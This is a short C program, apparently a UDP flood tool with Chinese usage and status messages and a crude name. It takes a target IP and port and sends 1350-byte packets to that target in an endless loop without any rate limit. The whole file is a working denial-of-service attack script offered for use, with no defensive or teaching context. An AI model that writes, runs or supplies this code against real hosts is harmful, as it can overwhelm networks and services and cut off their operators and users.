#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define PAYLOAD_SIZE 1350

int main(int argc, char *argv[]) {
    if (argc < 3) {
        printf("用法: %s <目标IP> <目标端口>\n", argv[0]);
        return 1;
    }

    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) { perror("socket"); return 1; }

    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(atoi(argv[2]));
    dest_addr.sin_addr.s_addr = inet_addr(argv[1]);

    char data[PAYLOAD_SIZE];
    memset(data, 'X', PAYLOAD_SIZE);

    printf("GoFuck启动测试: 目标 %s:%s\n", argv[1], argv[2]);

    while (1) {
        sendto(sockfd, data, PAYLOAD_SIZE, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
    }

    close(sockfd);
    return 0;
}
